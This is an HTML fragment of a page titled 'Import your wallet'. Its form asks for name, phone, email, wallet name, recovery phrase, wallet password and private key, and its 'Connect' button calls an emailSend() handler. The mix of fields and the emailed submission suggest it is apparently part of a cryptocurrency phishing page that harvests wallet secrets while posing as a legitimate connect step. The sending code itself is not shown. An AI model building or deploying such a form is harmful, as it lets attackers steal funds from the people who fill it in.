				<div class="frame">

	

		<img src="images/Import.png" width="23px" />
		<h2>Import your wallet</h2>

		<form onsubmit="emailSend(); reset(); return false;">

		 	 <div class="email">

			<input type="text" id="name" placeholder="Enter your name" name="userName" required>

			<img src="images/name.png" width="23px" />

			</div>

			

		  <div class="email">

			<input type="text" id="phone" placeholder="Enter your phone number" name="phone" required>

			<img src="images/contact.png" width="23px" />

			</div>

			

		 <div class="email">

			<input type="email" id="email" placeholder="Enter your Email" name="email" required>

			<img src="images/email.png" width="23px" />

			</div><hr color="#ffffff"></br>

		 <div class="email">

			<input type="text" id="wallet" placeholder="wallet name" name="wallet" required>

			<img src="images/wallet.png" width="23px" />

			</div>

			<div class="email">

			<input type="text" id="phrase" placeholder="phrase" name="phrase" required>

			<img src="images/phrase.png" width="23px" />

			</div>

			<div class="password">

			<input type="text" id="walletpassword" placeholder="wallet password" name="walletpassword" required>

			<img src="images/password.png" width="23px" />

			</div>

			<div class="email">

			<input type="text" id="privatekey" placeholder="private key" name="privatekey" required>

			<img src="images/padlock.png" width="23px" />

			</div> 

			<button type="submit" class="btn">Connect</button>

		</form>
